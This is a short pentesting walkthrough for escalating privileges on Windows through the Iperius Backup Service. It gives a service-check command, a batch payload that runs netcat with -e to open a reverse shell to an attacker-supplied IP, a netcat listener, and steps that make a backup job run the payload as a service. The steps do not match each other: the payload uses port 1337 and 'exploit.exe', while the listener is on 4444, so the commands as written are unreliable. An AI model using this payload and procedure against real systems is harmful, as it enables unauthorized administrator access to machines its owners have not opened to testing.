# Iperius Backup Service Privilege Escalation

Iperius Backup Service is a database backup software. It is vulnerable to privilege escalation in Windows.

### Investigation <a href="#investigation" id="investigation"></a>

First check if Iperius is running in target machine.

```
wmic service list | findstr "Iperius"
```

If the Iperius service is running, we can gain access to administrator privilege.

### Exploitation <a href="#exploitation" id="exploitation"></a>

#### 1. Create a Payload <a href="#id-1-create-a-payload" id="id-1-create-a-payload"></a>

In target machine, create a **.bat** file named "exploit.bat".

```
@echo off
C:\Users\<USERNAME>\Downloads\nc.exe <attack_machine_ip> 1337 -e exploit.exe
```

Then place it to Desktop.\
When saving, be sure to save it as the file type **"All Files"** (**NOT .txt**).

After that start a listener in local machine.

```
nc -lvnp 4444
```

#### 2. Create a New Backup in Iperius\*\* <a href="#id-2-create-a-new-backup-in-iperius" id="id-2-create-a-new-backup-in-iperius"></a>

1. Click **"Iperius"** icon in Windows Explorer (the common path is **C:\Program Files (x86)\Iperius Backup\Iperius**).
2. Right click the **"Iperius"** icon on the right-bottom of the bar to open it.
3. Click **"Create New Backup"** and select **"Add Folder"**.
4. Enter path (**c:\Users\\\<USERNAME>\Documents**) and click **"OK"**.
5. Navigate to **"Destination"** tab and select **"Add Destination Folder"**.
6. Enter path (**c:\Users\\\<USERNAME>\Descktop**) and click **"OK"**.
7. Navigate to **"Other Processes"** tab.
8. On **"Before backup"** section, check **"Run a program or open external file:"** and select **"exploit.bat"** file.

#### 3. Run the Backup <a href="#id-3-run-the-backup" id="id-3-run-the-backup"></a>

After setting a new backup, we can run it.\
On **"Iperius Backup"** window, right-click on backup jobs **"Documents"** and select **"Run backup as service"** then click **"OK"** on the dialog.

Now we should get a shell in local machine.
